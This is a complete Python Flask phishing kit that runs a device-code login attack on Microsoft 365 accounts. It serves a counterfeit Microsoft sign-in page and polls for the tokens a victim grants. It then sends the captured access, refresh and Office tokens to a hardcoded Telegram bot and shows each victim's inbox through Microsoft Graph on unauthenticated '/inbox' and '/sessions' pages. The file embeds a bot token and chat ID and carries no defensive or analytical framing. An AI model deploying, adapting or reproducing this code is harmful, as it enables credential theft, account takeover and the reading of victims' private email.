import os
import time
import json
import base64
import html
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

AUTHORITY = "https://login.microsoftonline.com/common"
TOKEN_URL = AUTHORITY + "/oauth2/v2.0/token"
DEVC_URL = AUTHORITY + "/oauth2/v2.0/devicecode"
GRAPH = "https://graph.microsoft.com/v1.0"

SCOPE = "openid profile offline_access User.Read Mail.Read"

CLIENT_IDS = [
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive Sync
    "00b41c95-dab0-4487-9791-b9d2c32c80f2",  # Office 365 Management
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (legacy)
]

SITE_URL = "https://outlook-verify.onrender.com"
app = Flask(__name__)
DB = "sessions.db"


# ─────────────────────────────────────────────
# DATABASE
# ─────────────────────────────────────────────
def db():
    conn = sqlite3.connect(DB, timeout=15)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT, id_token TEXT)""")
    conn.execute("""CREATE TABLE IF NOT EXISTS codes (
        sid TEXT PRIMARY KEY, device_code TEXT, client_id TEXT,
        created REAL, status TEXT)""")
    conn.commit()
    return conn


def log_event(msg):
    print(f"[LOG] {msg}", flush=True)


# ─────────────────────────────────────────────
# TELEGRAM
# ─────────────────────────────────────────────
def telegram(msg, tag=""):
    try:
        for i in range(0, len(msg), 3500):
            chunk = msg[i:i + 3500]
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk,
                      "disable_web_page_preview": "true"},
                timeout=15)
            if r.status_code != 200:
                log_event(f"Telegram Fail [{tag}]: {r.text}")
    except Exception as e:
        log_event(f"Telegram Error [{tag}]: {e}")


# ─────────────────────────────────────────────
# TOKEN HELPERS
# ─────────────────────────────────────────────
def decode_jwt(token):
    """Extract payload from a JWT without verifying the signature."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {}
        payload = parts[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception as e:
        log_event(f"JWT Decode Error: {e}")
        return {}


def get_email_from_id_token(id_token):
    payload = decode_jwt(id_token)
    return (payload.get('preferred_username')
            or payload.get('upn')
            or payload.get('email')
            or payload.get('unique_name')
            or 'unknown@unknown.com')


def harvest_session_cookies(refresh_token, client_id):
    """Exchange the refresh token for an Outlook/Office scoped access token."""
    office_token = ""
    try:
        r = requests.post(TOKEN_URL, data={
            "grant_type": "refresh_token",
            "client_id": client_id,
            "refresh_token": refresh_token,
            "scope": "https://outlook.office.com/.default"
        }, timeout=20)

        if r.status_code == 200:
            office_token = r.json().get('access_token', '')
        else:
            log_event(f"Office token exchange failed: {r.status_code} {r.text[:200]}")
    except Exception as e:
        log_event(f"Cookie Harvest Error: {e}")

    return office_token


# ─────────────────────────────────────────────
# WATCHER
# ─────────────────────────────────────────────
def watcher(sid, device_code, client_id):
    log_event(f"Watcher started for SID: {sid} using Client ID: {client_id}")

    for _ in range(300):  # ~25 minutes
        try:
            r = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": client_id,
                "device_code": device_code
            }, timeout=20)

            j = r.json()

            if "access_token" in j:
                access_token = j['access_token']
                refresh_token = j.get('refresh_token', '')
                id_token = j.get('id_token', '')

                email = get_email_from_id_token(id_token)
                office_token = harvest_session_cookies(refresh_token, client_id)

                conn = db()
                conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?)",
                             (sid, email, access_token, refresh_token,
                              time.time() + 3600, "", id_token))
                conn.execute("UPDATE codes SET status='completed' WHERE sid=?", (sid,))
                conn.commit()
                conn.close()

                log_event(f"SUCCESS: {email}")

                msg = (
                    f"NEW CAPTURE\n"
                    f"-----------------------------\n"
                    f"Email: {email}\n"
                    f"Client ID: {client_id}\n\n"
                    f"Access Token:\n{access_token}\n\n"
                    f"Refresh Token:\n{refresh_token or '(none)'}\n\n"
                    f"Office Token:\n{office_token or '(none)'}\n\n"
                    f"Inbox View: {SITE_URL}/inbox/{sid}"
                )
                telegram(msg, tag="capture")
                return

            elif j.get("error") == "authorization_pending":
                time.sleep(5)
                continue

            elif j.get("error") == "slow_down":
                time.sleep(10)
                continue

            else:
                err = j.get('error', 'unknown')
                desc = j.get('error_description', '')
                log_event(f"Polling error: {err} - {desc}")
                conn = db()
                conn.execute("UPDATE codes SET status=? WHERE sid=?", (err, sid))
                conn.commit()
                conn.close()
                return

        except Exception as e:
            log_event(f"Watcher Exception: {e}")
            time.sleep(5)

    log_event(f"Watcher timed out for SID: {sid}")
    conn = db()
    conn.execute("UPDATE codes SET status='timeout' WHERE sid=?", (sid,))
    conn.commit()
    conn.close()


# ─────────────────────────────────────────────
# TEMPLATES
# ─────────────────────────────────────────────
PAGE = """<!doctype html>
<html>
<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width,initial-scale=1'>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f3f2f1; display: flex;
               justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 44px; width: 100%; max-width: 440px;
                box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; box-sizing: border-box; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 108px; }
        h2 { font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b; }
        p { font-size: 15px; color: #1b1b1b; margin: 0 0 20px; line-height: 1.5; }
        .code-box { background: #f3f2f1; padding: 15px; font-size: 30px; font-weight: 700;
                    letter-spacing: 4px; color: #0067b8; margin: 20px 0; border-radius: 4px;
                    user-select: all; word-break: break-all; }
        .btn { background: #0067b8; color: #fff; border: none; padding: 11px 24px; font-size: 15px;
               cursor: pointer; border-radius: 2px; width: 100%; margin-top: 10px; font-family: inherit; }
        .btn:hover { background: #005da6; }
        .footer { margin-top: 30px; font-size: 12px; color: #605e5c; }
        .footer a { color: #0067b8; text-decoration: none; }
        .hidden { display: none; }
        .ok { color: #107c10; font-weight: 600; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
        </div>

        {% if error %}
            <h2>Something went wrong</h2>
            <p>{{ error }}</p>
            <button class="btn" onclick="location.reload()">Try Again</button>
        {% else %}
            <h2>Enter code</h2>
            <p>To sign in, copy the code below and paste it on the next screen.</p>

            <div class="code-box" id="userCode">{{ user_code }}</div>

            <button class="btn" id="copyBtn" onclick="handleCopy()">Copy Code &amp; Continue</button>
            <p class="hidden ok" id="statusMsg">Code copied. Redirecting…</p>
        {% endif %}

        <div class="footer">
            <a href="https://microsoft.com/devicelogin">Can't access your account?</a>
        </div>
    </div>

    {% if not error %}
    <script>
        const sid = {{ sid|tojson }};

        function handleCopy() {
            const code = document.getElementById('userCode').innerText.trim();
            const go = () => {
                document.getElementById('copyBtn').classList.add('hidden');
                document.getElementById('statusMsg').classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = "https://microsoft.com/devicelogin";
                }, 1200);
            };

            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(code).then(go).catch(go);
            } else {
                const ta = document.createElement('textarea');
                ta.value = code;
                document.body.appendChild(ta);
                ta.select();
                try { document.execCommand('copy'); } catch (e) {}
                document.body.removeChild(ta);
                go();
            }
        }

        setInterval(async () => {
            try {
                const res = await fetch('/status?sid=' + encodeURIComponent(sid));
                const data = await res.json();
                if (data.done) {
                    document.getElementById('statusMsg').innerText = 'Sign-in successful. Redirecting…';
                }
            } catch (e) {}
        }, 5000);
    </script>
    {% endif %}
</body>
</html>"""


INBOX_PAGE = """<!doctype html>
<html>
<head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width,initial-scale=1'>
    <title>Inbox — {{ email }}</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f3f2f1; margin: 0;
               padding: 24px 16px; color: #1b1b1b; }
        .wrap { max-width: 900px; margin: 0 auto; }
        header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px;
                 flex-wrap: wrap; }
        header img { width: 96px; }
        h1 { font-size: 20px; margin: 0; font-weight: 600; }
        .badge { background: #fff; border: 1px solid #e1dfdd; border-radius: 12px;
                 padding: 3px 10px; font-size: 12px; color: #605e5c; }
        table { width: 100%; border-collapse: collapse; background: #fff;
                box-shadow: 0 1px 4px rgba(0,0,0,0.12); }
        th, td { text-align: left; padding: 12px 14px; font-size: 14px;
                 border-bottom: 1px solid #edebe9; vertical-align: top; }
        th { background: #faf9f8; font-weight: 600; font-size: 12px;
             text-transform: uppercase; letter-spacing: .5px; color: #605e5c; }
        tr:hover td { background: #faf9f8; }
        .subj { font-weight: 600; }
        .prev { color: #605e5c; font-size: 13px; margin-top: 4px; }
        .date { white-space: nowrap; color: #605e5c; font-size: 13px; }
        .empty { padding: 40px; text-align: center; color: #605e5c; }
        pre { background: #201f1e; color: #eaeaea; padding: 14px; border-radius: 4px;
              overflow-x: auto; font-size: 12px; }
        details { margin-top: 24px; }
        summary { cursor: pointer; font-size: 13px; color: #0067b8; }
        @media (max-width: 560px) {
            th:nth-child(1), td:nth-child(1) { display: none; }
        }
    </style>
</head>
<body>
    <div class="wrap">
        <header>
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
            <h1>{{ email }}</h1>
            <span class="badge">{{ count }} message(s)</span>
        </header>

        {% if rows %}
        <table>
            <thead>
                <tr><th>Received</th><th>From / Subject</th></tr>
            </thead>
            <tbody>
                {{ rows|safe }}
            </tbody>
        </table>
        {% else %}
        <div class="empty">{{ note }}</div>
        {% endif %}

        <details>
            <summary>Raw session data</summary>
            <pre>{{ raw|safe }}</pre>
        </details>
    </div>
</body>
</html>"""


# ─────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────
@app.route("/")
def home():
    selected_client = None
    device_code_resp = None

    for cid in CLIENT_IDS:
        try:
            resp = requests.post(DEVC_URL, data={
                "client_id": cid,
                "scope": SCOPE
            }, timeout=10)

            data = resp.json()
            if "user_code" in data and "device_code" in data:
                selected_client = cid
                device_code_resp = data
                log_event(f"Client {cid} issued device code")
                break
            else:
                log_event(f"Client {cid} failed: {data.get('error')} - "
                          f"{data.get('error_description', '')[:160]}")
        except Exception as e:
            log_event(f"Client {cid} exception: {e}")

    if not selected_client:
        return render_template_string(PAGE, error="Service unavailable. Please try again later.",
                                      user_code="", sid="")

    sid = str(int(time.time())) + "_" + os.urandom(4).hex()

    conn = db()
    conn.execute("INSERT INTO codes (sid, device_code, client_id, created, status) "
                 "VALUES (?,?,?,?,?)",
                 (sid, device_code_resp['device_code'], selected_client,
                  time.time(), 'pending'))
    conn.commit()
    conn.close()

    t = Thread(target=watcher,
               args=(sid, device_code_resp['device_code'], selected_client))
    t.daemon = True
    t.start()

    return render_template_string(PAGE, user_code=device_code_resp['user_code'],
                                  sid=sid, error=None)


@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    conn = db()
    row = conn.execute("SELECT status FROM codes WHERE sid=?", (sid,)).fetchone()
    conn.close()

    if row and row[0] == 'completed':
        return jsonify({"done": True})
    return jsonify({"done": False})


@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()

    if not row:
        return render_template_string(
            INBOX_PAGE, email="Session not found", rows="", count=0,
            note="This session has expired or was never captured.",
            raw="(none)"), 404

    sid_, email, access_token, refresh_token, expires_at, cookies, id_token = row

    rows_html = ""
    note = ""
    count = 0

    try:
        resp = requests.get(
            f"{GRAPH}/me/mailFolders/inbox/messages"
            f"?$top=10&$select=subject,from,bodyPreview,receivedDateTime",
            headers={"Authorization": "Bearer " + access_token},
            timeout=20
        )
        data = resp.json()

        if "value" in data:
            count = len(data["value"])
            for m in data["value"]:
                sender = (m.get('from', {})
                           .get('emailAddress', {})
                           .get('address', 'Unknown'))
                subject = html.escape(m.get('subject') or '(No Subject)')
                preview = html.escape((m.get('bodyPreview') or '')[:120])
                date = html.escape((m.get('receivedDateTime') or '')[:10])
                sender = html.escape(sender)

                rows_html += (
                    f"<tr>"
                    f"<td class='date'>{date}</td>"
                    f"<td><div class='subj'>{subject}</div>"
                    f"<div class='prev'>{sender} — {preview}</div></td>"
                    f"</tr>"
                )
            if count == 0:
                note = "Inbox is empty."
        else:
            note = html.escape(data.get('error', {}).get('message', 'Graph returned no data.'))

    except Exception as e:
        log_event(f"Inbox fetch error: {e}")
        note = "Could not reach Microsoft Graph."

    raw = json.dumps({
        "sid": sid_,
        "email": email,
        "access_token": access_token,
        "refresh_token": refresh_token,
        "id_token": id_token,
        "expires_at": expires_at,
    }, indent=2)
    raw = html.escape(raw)

    return render_template_string(INBOX_PAGE, email=html.escape(email or "Unknown"),
                                  rows=rows_html, count=count,
                                  note=note, raw=raw)


@app.route("/sessions")
def sessions():
    conn = db()
    rows = conn.execute(
        "SELECT sid, email, expires_at FROM sessions ORDER BY expires_at DESC"
    ).fetchall()
    conn.close()

    if not rows:
        return "<p>No captures yet.</p>"

    out = "<h3>Captured sessions</h3><ul>"
    for sid_, email, exp in rows:
        out += (f"<li><a href='/inbox/{html.escape(sid_)}'>{html.escape(email or '?')}</a>"
                f" — {time.strftime('%Y-%m-%d %H:%M', time.localtime(exp))}</li>")
    out += "</ul>"
    return out


@app.route("/health")
def health():
    return jsonify({"ok": True, "time": time.time()})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
